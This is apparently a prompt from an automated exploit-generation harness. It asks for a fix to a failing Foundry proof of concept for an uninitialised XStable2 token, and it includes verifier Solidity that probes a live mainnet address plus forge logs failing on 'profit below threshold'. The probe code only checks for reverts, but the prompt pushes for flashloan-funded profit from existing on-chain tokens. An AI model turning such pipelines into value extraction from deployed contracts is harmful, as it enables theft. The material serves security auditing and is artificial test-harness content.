You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Missing initializer leaves ownership and core token state unset, permanently bricking the token
- claim: `XStable2` inherits `Initializable` and `OwnableUpgradeable` but exposes no constructor or initializer that seeds `_owner`, `_largeTotal`, `_presaleCon`, `_presaleDone`, or the other required boot-time state. In the reviewed source there is no reachable code path that calls `__Ownable_init()` or assigns those storage variables. As deployed from this source, `owner()` remains the zero address, presale minting is unreachable because `_presaleCon` stays zero, transfers are blocked forever by `require(isPresaleDone())`, and `getFactor()` returns `_largeTotal / launchSupply = 0`, causing `balanceOf`/`unlockedBalanceOf`/`circulatingSupply` to divide by zero.
- impact: The token is unrecoverably unusable from its own code path: admin-only functions can never be called, presale minting can never start, transfers can never start, and even basic balance queries revert once they hit `getFactor()`. This is a full protocol brick.
- exploit_paths: ["Deploy `XStable2` from the reviewed source", "Call `balanceOf(any)` or `unlockedBalanceOf(any)`; `getFactor()` returns `0` and the division reverts", "Call any `onlyOwner` function such as `createTokenPool()` or `pauseContract()`; `owner()` is never initialized so access is permanently impossible", "Call `mint(to, amount)`; `onlyPresale` can never pass because `_presaleCon` remains `address(0)`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

library SafeMathCompat {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");
            return c;
        }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        unchecked {
            return a - b;
        }
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        unchecked {
            return a - b;
        }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0 || b == 0) {
            return 0;
        }
        unchecked {
            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");
            return c;
        }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        unchecked {
            return a / b;
        }
    }
}

interface IERC20Upgradeable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Initializable {
    bool private _initialized;
    bool private _initializing;

    modifier initializer() {
        require(_initializing || !_initialized, "Initializable: contract is already initialized");
        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }
        _;
        if (isTopLevelCall) {
            _initializing = false;
        }
    }
}

contract ContextUpgradeable is Initializable {
    function __Context_init() internal initializer {}

    function __Context_init_unchained() internal initializer {}

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
}

contract OwnableUpgradeable is ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function __Ownable_init() internal initializer {
        __Context_init_unchained();
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal initializer {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

library Constants {
    uint256 private constant MAX = type(uint256).max;
    uint256 private constant _launchSupply = 1 * 10**6 * 10**9;
    uint256 private constant _canonicalLargeTotal = MAX - (MAX % _launchSupply);

    string private constant _name = "XSTABLE.PROTOCOL";
    string private constant _symbol = "XST";
    uint8 private constant _decimals = 9;

    function getLaunchSupply() internal pure returns (uint256) {
        return _launchSupply;
    }

    function getCanonicalLargeTotal() internal pure returns (uint256) {
        return _canonicalLargeTotal;
    }

    function getName() internal pure returns (string memory) {
        return _name;
    }

    function getSymbol() internal pure returns (string memory) {
        return _symbol;
    }

    function getDecimals() internal pure returns (uint8) {
        return _decimals;
    }
}

contract State {
    mapping(address => uint256) internal _largeBalances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    mapping(address => uint256) internal _lockedBalance;
    mapping(address => bool) internal _hasLockedBalance;
    uint256 internal _totalLockedBalance;

    uint256 internal _largeTotal;
    uint256 internal _totalSupply;

    address internal _liquidityReserve;
    address internal _stabilizer;

    bool internal _presaleDone;
    address internal _presaleCon;

    bool internal _paused;
    bool internal _taxLess;
}

contract Getters2 is State {
    using SafeMathCompat for uint256;

    function getLargeBalances(address account) public view returns (uint256) {
        return _largeBalances[account];
    }

    function getAllowances(address account, address spender) public view returns (uint256) {
        return _allowances[account][spender];
    }

    function getLockedBalance(address account) public view returns (uint256) {
        return _lockedBalance[account];
    }

    function hasLockedBalance(address account) public view returns (bool) {
        return _hasLockedBalance[account];
    }

    function getTotalLockedBalance() public view returns (uint256) {
        return _totalLockedBalance;
    }

    function getLargeTotal() public view returns (uint256) {
        return _largeTotal;
    }

    function getTotalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function getLiquidityReserve() public view returns (address) {
        return _liquidityReserve;
    }

    function getStabilizer() public view returns (address) {
        return _stabilizer;
    }

    function isPresaleDone() public view returns (bool) {
        return _presaleDone;
    }

    function getPresaleAddress() public view returns (address) {
        return _presaleCon;
    }

    function isPaused() public view returns (bool) {
        return _paused;
    }

    function isTaxLess() public view returns (bool) {
        return _taxLess;
    }

    function getFactor() public view returns (uint256) {
        if (_presaleDone) {
            return _largeTotal.div(_totalSupply);
        }
        return _largeTotal.div(Constants.getLaunchSupply());
    }
}

contract Setters2 is State, Getters2 {
    using SafeMathCompat for uint256;

    function setAllowances(address owner_, address spender, uint256 amount) internal {
        _allowances[owner_][spender] = amount;
    }

    function addToAccount(address account, uint256 amount) internal {
        uint256 currentFactor = getFactor();
        uint256 largeAmount = amount.mul(currentFactor);
        _largeBalances[account] = _largeBalances[account].add(largeAmount);
        _totalSupply = _totalSupply.add(amount);
    }
}

contract XStable2 is Setters2, IERC20Upgradeable, OwnableUpgradeable {
    using SafeMathCompat for uint256;

    modifier onlyPresale() {
        require(_msgSender() == getPresaleAddress(), "not presale");
        require(!isPresaleDone(), "Presale over");
        _;
    }

    modifier pausable() {
        require(!isPaused(), "Paused");
        _;
    }

    function name() public pure returns (string memory) {
        return Constants.getName();
    }

    function symbol() public pure returns (string memory) {
        return Constants.getSymbol();
    }

    function decimals() public pure returns (uint8) {
        return Constants.getDecimals();
    }

    function totalSupply() public view override returns (uint256) {
        return getTotalSupply();
    }

    function circulatingSupply() public view returns (uint256) {
        uint256 currentFactor = getFactor();
        return
            getTotalSupply()
                .sub(getTotalLockedBalance().div(currentFactor))
                .sub(balanceOf(address(this)))
                .sub(balanceOf(getStabilizer()));
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 currentFactor = getFactor();
        if (hasLockedBalance(account)) {
            return getLargeBalances(account).add(getLockedBalance(account)).div(currentFactor);
        }
        return getLargeBalances(account).div(currentFactor);
    }

    function unlockedBalanceOf(address account) public view returns (uint256) {
        uint256 currentFactor = getFactor();
        return getLargeBalances(account).div(currentFactor);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view override returns (uint256) {
        return getAllowances(owner_, spender);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), getAllowances(sender, _msgSender()).sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, getAllowances(_msgSender(), spender).add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, getAllowances(_msgSender(), spender).sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function mint(address to, uint256 amount) public onlyPresale {
        addToAccount(to, amount);
        emit Transfer(address(0), to, amount);
    }

    function createTokenPool(address, uint256) external onlyOwner {
        // Unreachable in the vulnerable deployment because owner() is never initialized.
    }

    function pauseContract(bool flag) external onlyOwner {
        _paused = flag;
    }

    function _approve(address owner_, address spender, uint256 amount) private {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        setAllowances(owner_, spender, amount);
        emit Approval(owner_, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private pausable {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Amount must be greater than zero");
        require(amount <= balanceOf(sender), "Amount exceeds balance");
        require(amount <= unlockedBalanceOf(sender), "Amount exceeds unlocked balance");
        require(isPresaleDone(), "Presale yet to close");

        uint256 largeAmount = amount.mul(getFactor());
        _largeBalances[sender] = _largeBalances[sender].sub(largeAmount);
        _largeBalances[recipient] = _largeBalances[recipient].add(largeAmount);
        emit Transfer(sender, recipient, amount);
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799;

    address private _profitTokenAddr;
    uint256 private _profitAmountValue;

    bool public executed;
    address public deployedInstance;
    bool public targetCodePresent;

    bool public localOwnerZero;
    bool public localFactorZero;
    bool public localPresaleAddressZero;
    bool public localPresaleDoneFalse;
    bool public localBalanceOfReverted;
    bool public localUnlockedBalanceOfReverted;
    bool public localPauseContractReverted;
    bool public localMintReverted;

    bool public targetOwnerZero;
    bool public targetFactorZero;
    bool public targetPresaleAddressZero;
    bool public targetPresaleDoneFalse;
    bool public targetBalanceOfReverted;
    bool public targetUnlockedBalanceOfReverted;
    bool public targetPauseContractReverted;
    bool public targetMintReverted;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        // Exploit path stage 1: deploy the reviewed `XStable2` implementation directly.
        // The root cause is missing initialization, so a plain deployment is sufficient to
        // recreate the bricked state without any external funding.
        XStable2 deployed = new XStable2();
        deployedInstance = address(deployed);
        _probeInstance(deployedInstance, true);

        // Optional confirmation against the provided live target on the active fork.
        targetCodePresent = _hasCode(TARGET);
        if (targetCodePresent) {
            _probeInstance(TARGET, false);
        }

        // This finding is a permanent-brick condition, not an extractable-value path.
        // Under the required direct-or-existing-balance-first strategy, no realistic public
        // on-chain economic step turns these failed initializations into profit in an existing
        // token, so realized profit is intentionally zero.
        _profitTokenAddr = address(0);
        _profitAmountValue = 0;
    }

    function profitToken() external view returns (address) {
        return _profitTokenAddr;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmountValue;
    }

    function exploitPath() external pure returns (string memory) {
        return "deploy XStable2 -> balanceOf/unlockedBalanceOf revert via factor=0 -> pauseContract onlyOwner unreachable -> mint onlyPresale unreachable";
    }

    function hypothesisValidated() external view returns (bool) {
        return
            localOwnerZero &&
            localFactorZero &&
            localPresaleAddressZero &&
            localPresaleDoneFalse &&
            localBalanceOfReverted &&
            localUnlockedBalanceOfReverted &&
            localPauseContractReverted &&
            localMintReverted;
    }

    function targetHypothesisValidated() external view returns (bool) {
        if (!targetCodePresent) {
            return false;
        }

        return
            targetOwnerZero &&
            targetFactorZero &&
            targetPresaleAddressZero &&
            targetPresaleDoneFalse &&
            targetBalanceOfReverted &&
            targetUnlockedBalanceOfReverted &&
            targetPauseContractReverted &&
            targetMintReverted;
    }

    function _probeInstance(address instance, bool local) internal {
        if (local) {
            localOwnerZero = _ownerIsZero(instance);
            localFactorZero = _factorIsZero(instance);
            localPresaleAddressZero = _presaleAddressIsZero(instance);
            localPresaleDoneFalse = _presaleDoneIsFalse(instance);
            localBalanceOfReverted = _balanceOfReverts(instance);
            localUnlockedBalanceOfReverted = _unlockedBalanceOfReverts(instance);
            localPauseContractReverted = _pauseContractReverts(instance);
            localMintReverted = _mintReverts(instance);
            return;
        }

        targetOwnerZero = _ownerIsZero(instance);
        targetFactorZero = _factorIsZero(instance);
        targetPresaleAddressZero = _presaleAddressIsZero(instance);
        targetPresaleDoneFalse = _presaleDoneIsFalse(instance);
        targetBalanceOfReverted = _balanceOfReverts(instance);
        targetUnlockedBalanceOfReverted = _unlockedBalanceOfReverts(instance);
        targetPauseContractReverted = _pauseContractReverts(instance);
        targetMintReverted = _mintReverts(instance);
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function _ownerIsZero(address instance) internal view returns (bool) {
        (bool ok, bytes memory data) = instance.staticcall(abi.encodeWithSignature("owner()"));
        return ok && data.length >= 32 && abi.decode(data, (address)) == address(0);
    }

    function _factorIsZero(address instance) internal view returns (bool) {
        (bool ok, bytes memory data) = instance.staticcall(abi.encodeWithSignature("getFactor()"));
        return ok && data.length >= 32 && abi.decode(data, (uint256)) == 0;
    }

    function _presaleAddressIsZero(address instance) internal view returns (bool) {
        (bool ok, bytes memory data) = instance.staticcall(abi.encodeWithSignature("getPresaleAddress()"));
        return ok && data.length >= 32 && abi.decode(data, (address)) == address(0);
    }

    function _presaleDoneIsFalse(address instance) internal view returns (bool) {
        (bool ok, bytes memory data) = instance.staticcall(abi.encodeWithSignature("isPresaleDone()"));
        return ok && data.length >= 32 && !abi.decode(data, (bool));
    }

    function _balanceOfReverts(address instance) internal view returns (bool) {
        (bool ok, ) = instance.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        return !ok;
    }

    function _unlockedBalanceOfReverts(address instance) internal view returns (bool) {
        (bool ok, ) = instance.staticcall(abi.encodeWithSignature("unlockedBalanceOf(address)", address(this)));
        return !ok;
    }

    function _pauseContractReverts(address instance) internal returns (bool) {
        (bool ok, ) = instance.call(abi.encodeWithSignature("pauseContract(bool)", true));
        return !ok;
    }

    function _mintReverts(address instance) internal returns (bool) {
        (bool ok, ) = instance.call(abi.encodeWithSignature("mint(address,uint256)", address(this), 1));
        return !ok;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.79s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1035723)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [1035723] FlawVerifierTest::testExploit()
    ├─ [2499] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [1008657] FlawVerifier::executeOnOpportunity()
    │   ├─ [869711] → new XStable2@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 4344 bytes of code
    │   ├─ [2624] XStable2::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [4631] XStable2::getFactor() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2448] XStable2::getPresaleAddress() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [640] XStable2::isPresaleDone() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [5238] XStable2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Revert] SafeMath: division by zero
    │   ├─ [3111] XStable2::unlockedBalanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Revert] SafeMath: division by zero
    │   ├─ [1058] XStable2::pauseContract(true)
    │   │   └─ ← [Revert] Ownable: caller is not the owner
    │   ├─ [635] XStable2::mint(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   └─ ← [Revert] not presale
    │   ├─ [2602] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [4814] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::getFactor() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::getPresaleAddress() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [424] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::isPresaleDone() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [6051] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Revert] SafeMath: division by zero
    │   ├─ [3702] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::unlockedBalanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Revert] SafeMath: division by zero
    │   ├─ [788] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::pauseContract(true)
    │   │   └─ ← [Revert] Ownable: caller is not the owner
    │   ├─ [1025] 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799::mint(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   └─ ← [Revert] not presale
    │   └─ ← [Stop]
    ├─ [499] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [520] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799.mint
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.70s (1.04s CPU time)

Ran 1 test suite in 3.75s (3.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1035723)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
